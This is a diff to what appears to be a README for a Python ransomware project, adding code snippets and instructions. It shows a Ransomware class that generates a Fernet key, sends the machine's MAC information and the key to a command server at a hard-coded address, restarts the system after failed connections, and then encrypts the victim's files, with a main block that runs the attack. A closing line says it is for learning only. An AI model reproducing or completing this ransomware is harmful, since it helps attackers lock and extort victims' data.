@@ -2,7 +2,7 @@
 
 This Python module implements a simple ransomware that connects to a server, encrypts files, and decrypts them using the Fernet encryption algorithm. To use the ransomware, first import the necessary modules, including time, system utilities, encryption tools, and socket communication. Then, define the `Ransomware` class, initializing it with the server's host and port. Connect to the server using the `ConnectServer` method, which attempts to establish a connection and sends system information along with an encryption key. Once connected, you can encrypt files using the `Encrypted` method and decrypt them using the `Decrypted` method. Finally, instantiate the `Ransomware` class and execute the ransomware script, ensuring that the server's host and port are configured correctly.
 
-1. Import the necessary modules:
+1. **Import the necessary modules**:
    ```python
    from time import sleep
    from modules.system import System
@@ -11,7 +11,7 @@ This Python module implements a simple ransomware that connects to a server, enc
    ```
 This Python module implements a simple ransomware that connects to a server, encrypts files, and decrypts them using the Fernet encryption algorithm.
 
-2. Class Ransomware:
+2. **Class Ransomware**:
     ```python
     def __init__(self, host: str, port: int) -> None:
         self.key = Fernet.generate_key()
@@ -41,6 +41,25 @@ This Python module implements a simple ransomware that connects to a server, enc
             finally:
                 self.server.close()
     ```
-Connect to the server, send mac information and encryption key to the server. Retry the connection after 10 seconds, restart the system if the connection fails after 3 attempts.Sending information to the server successfully, closes the connection.
+ - The `ConnectServer` method attempts to connect to the server via the provided IP address and port. If it cannot connect after 3 attempts, the system will reset.
 
-Please note: This code should only be used for learning purposes. Using it to perform illegal activities (such as cyber attacks) can lead to serious legal consequences. Always comply with legal regulations when using and developing open source code.
+    ```python
+    def Encrypted(self):
+        Encrypt(self.Private)
+    
+    def Decrypted(self):
+        Decrypt(self.Private)
+    ```
+ - The `Encrypted` method encrypts data using the generated private key.
+ - The `Decrypted` method decrypts data using the same private key.
+    
+    ```python
+    if __name__ == '__main__':
+        bot = Ransomware('192.168.1.12', 19100)
+        bot.ConnectServer()
+        bot.Encrypted()
+    ```
+ - When initializing a `Ransomware` object, you need to provide the IP address (`host`) and port (`port`) of the server you want to connect to.
+
+
+**Please note**: *This code should only be used for learning purposes. Using it to perform illegal activities (such as cyber attacks) can lead to serious legal consequences. Always comply with legal regulations when using and developing open source code.*
